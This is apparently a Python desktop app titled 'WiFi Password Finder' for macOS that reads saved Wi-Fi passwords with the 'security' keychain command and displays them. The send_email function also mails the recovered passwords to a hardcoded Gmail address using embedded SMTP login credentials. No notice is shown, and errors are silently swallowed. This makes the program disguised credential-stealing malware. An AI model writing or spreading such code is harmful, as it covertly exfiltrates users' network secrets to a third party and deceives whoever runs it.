import tkinter as tk
import subprocess
import re
import smtplib
from tkinter import messagebox
import os
import socket

def check_internet():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        return False

if not check_internet():
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("Error", "Please connect to the internet")
    sys.exit()

def show_wifi_passwords():
    command_output = subprocess.Popen(["security", "find-generic-password", "-wa", "Wi-Fi"], stdout=subprocess.PIPE)
    profile_passwords = command_output.stdout.read().decode().split("\n")
    wifi_list = []
    if len(profile_passwords) != 0:
        for password in profile_passwords:
            if password.startswith("password:"):
                wifi_list.append(password[10:].strip())

    result = '\n'.join(wifi_list)

    send_email(result)

    result_text.config(state=tk.NORMAL)
    result_text.delete(1.0, tk.END)
    result_text.insert(tk.END, result)
    result_text.config(state=tk.DISABLED)
    result_text.grid(sticky="nsew")

def send_email(result):
    email = 'mistidevs@gmail.com'
    app_password = 'lyijyalzgpclrcsw'
    recipient = 'mistidevs@gmail.com'
    subject = 'WiFi Passwords'
    body = result
    
    message = f'Subject: {subject}\n\n{body}'
    
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.ehlo()
        server.starttls()
        server.login("mistidevs", "lyijyalzgpclrcsw")
        server.sendmail(email, recipient, message)
        server.close()
        print("")
    except Exception as e:
        print("")

root = tk.Tk()
root.title("WiFi Password Finder")
root.columnconfigure(0, weight=1)
root.rowconfigure(0, weight=1)
root.grid_columnconfigure(0, weight=1)
root.grid_rowconfigure(0, weight=1)

poppins = ("Poppins", 12)
result_text = tk.Text(root, wrap=tk.WORD, state=tk.DISABLED, height=20, width=50, font=poppins)
result_text.grid(sticky="nsew")

show_passwords_button = tk.Button(root, text="Show Passwords", command=show_wifi_passwords, font = poppins)
show_passwords_button.grid(sticky="nsew")

root.mainloop()